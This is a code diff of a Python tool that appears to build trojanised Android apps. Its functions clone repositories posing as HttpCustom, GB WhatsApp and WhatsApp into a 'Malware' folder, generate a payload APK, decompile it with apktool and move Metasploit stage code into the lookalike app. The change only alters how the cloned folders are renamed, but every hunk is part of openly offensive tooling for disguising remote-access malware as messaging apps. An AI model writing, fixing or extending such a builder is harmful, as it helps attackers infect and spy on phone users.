@@ -101,7 +101,8 @@ def payload():
 	
 def httpcustom():
 	os.system("cd Malware && rm -rf payload.apk payload A")
-	os.system("git clone http://github.com/PyRAT-svg/HttpCustom &&mv -f HttpCustom Malware/A")
+	os.system("git clone http://github.com/PyRAT-svg/HttpCustom &&mv -f HttpCustom Malware")
+	os.rename('Malware/HttpCustom', 'Malware/A')
 	payload()
 	os.system("cd Malware && apktool d payload.apk -o payload")
 	os.system("rm -rf Malware/A/README.md  Malware/A/.git Malware/A/smali/xyz/metasploit/stage")
@@ -113,7 +114,8 @@ def httpcustom():
 
 def gbwa():
 	os.system("cd Malware && rm -rf payload.apk payload A")
-	os.system("git clone http://github.com/PyRAT-svg/GbWhatsApp &&mv -f GbWhatsApp Malware/A")
+	os.system("git clone http://github.com/PyRAT-svg/GbWhatsApp &&mv -f GbWhatsApp Malware")
+	os.rename('Malware/GbWhatsApp', 'Malware/A')
 	payload()
 	os.system("cd Malware && apktool d payload.apk -o payload")
 	os.system("rm -rf Malware/A/README.md  Malware/A/.git Malware/A/smali/com/metasploit/stage")
@@ -126,7 +128,8 @@ def gbwa():
 		
 def wa():
 	os.system("cd Malware && rm -rf payload.apk payload A")
-	os.system("git clone http://github.com/PyRAT-svg/WhatsApp && mv -f WhatsApp Malware/A")
+	os.system("git clone http://github.com/PyRAT-svg/WhatsApp&& mv -f WhatsApp Malware")
+	os.rename('Malware/WhatsApp', 'Malware/A')
 	payload()
 	os.system("cd Malware && apktool d payload.apk -o payload")
 	os.system("rm -rf Malware/A/README.md  Malware/A/.git Malware/A/smali/com/metasploit/stage")
